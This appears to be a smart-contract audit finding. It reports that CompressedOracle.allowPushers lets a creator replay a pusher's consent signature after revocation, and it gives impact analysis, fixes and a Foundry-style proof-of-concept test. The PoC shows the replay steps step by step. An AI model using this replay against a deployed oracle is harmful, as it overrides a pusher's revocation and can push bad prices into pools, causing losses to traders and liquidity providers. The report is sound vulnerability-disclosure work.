### Title
`allowPushers` delegation signature is replayable within the deadline window, allowing a creator to silently re-establish a revoked pusher delegation and redirect future oracle writes into their namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` accepts a pusher's EIP-191 consent signature and maps `namespaceRemapping[pusher] = creator`. The only replay guard is a deadline (`block.timestamp <= deadline`). No nonce, no used-signature bitmap, and no per-pusher revocation counter is tracked. A creator who holds a valid, non-expired signature can call `allowPushers` again with the **same signature** after the pusher has called `revokePusher()`, silently re-establishing the delegation without any fresh consent from the pusher.

The contract's own NatSpec comment acknowledges the risk but the implementation does not close it:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

The deadline only caps the window of exposure; it does not prevent replay within that window.

---

### Finding Description

`allowPushers` computes the signed hash as:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

and then writes:

```solidity
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no mapping of `keccak256(signature) => bool`, no per-pusher nonce, and no check that `namespaceRemapping[pusher]` is currently `address(0)` before writing. The only guard is `_ensureDeadline(deadline)`:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But nothing prevents the creator from immediately calling `allowPushers` again with the same signature to restore `namespaceRemapping[pusher] = creator`.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So any push the pusher makes after their revocation — believing they are writing to their own namespace — will instead land in the creator's namespace if the creator has replayed the delegation.

---

### Impact Explanation

The `namespaceRemapping` state determines which creator namespace every fallback push lands in. A pusher who revokes intends to stop contributing data to the creator's feeds. If the creator replays the old signature, the pusher's automated price-pushing system continues writing into the creator's namespace without the pusher's knowledge or consent.

Those writes flow directly into the oracle read path:

```
pool.swap → provider.getBidAndAskPrice → CompressedOracle.price(feedId) → getOracleData → _loadSlotLayout
``` [5](#0-4) 

If the pusher revoked because their key was compromised, or because they detected a data quality issue, the creator can force those bad prices to continue reaching pools. This is a bad-price execution path: stale or wrong bid/ask values reach `MetricOmmPool.swap` and drive trades at incorrect prices, causing direct loss to traders or LPs.

---

### Likelihood Explanation

- The creator holds the original signature (they submitted it in the first `allowPushers` call).
- The pusher's revocation is a public on-chain event; the creator can front-run or immediately follow it with a replay.
- The pusher has no on-chain way to invalidate the old signature before the deadline expires.
- Automated price-pushing systems (the primary use case for delegated pushers) will continue pushing after revocation, unaware the delegation was re-established.

The trigger requires only the creator to act — no external attacker needed. The creator is a semi-trusted actor whose ability to override a pusher's explicit revocation is an admin-boundary break.

---

### Recommendation

Track used signatures with a per-pusher revocation generation counter or a used-signature bitmap:

```solidity
// Option A: per-pusher nonce incremented on every revoke
mapping(address => uint256) public pusherNonce;

// include nonce in the signed hash
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))

// increment on revoke
pusherNonce[msg.sender]++;
```

Or alternatively, mark signatures as consumed:

```solidity
mapping(bytes32 => bool) private _usedDelegationSig;

bytes32 sigHash = keccak256(signatures[i]);
require(!_usedDelegationSig[sigHash], "signature already used");
_usedDelegationSig[sigHash] = true;
```

Either approach ensures that a pusher's `revokePusher()` call permanently invalidates any prior consent signature, matching the documented intent.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = T + 7 days
uint256 deadline = block.timestamp + 7 days;
bytes memory sig = pusher.sign(
    keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
);

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // cleared

// 4. Creator replays the SAME signature — no revert, delegation restored
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // ← re-established without fresh consent

// 5. Pusher's next push (intended for own namespace) lands in creator's namespace
vm.prank(pusher);
(bool ok,) = address(oracle).call(wordAt(slotId, pos, badPrice, tsMs));
assertTrue(ok);
// creator's feed now contains the pusher's data — bad price reaches pools
assertEq(oracle.getOracleData(oracle.feedIdOf(creator, slotId, pos)).price, badPrice);
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher,   slotId, pos)).price, 0);
``` [6](#0-5)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L171-178)
```text
    function _price(bytes32 feedId)
        internal
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        OracleData memory data = getOracleData(feedId);
        return (uint256(data.price), uint256(data.spread0), data.spread1, data.timestampMs.toSeconds());
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
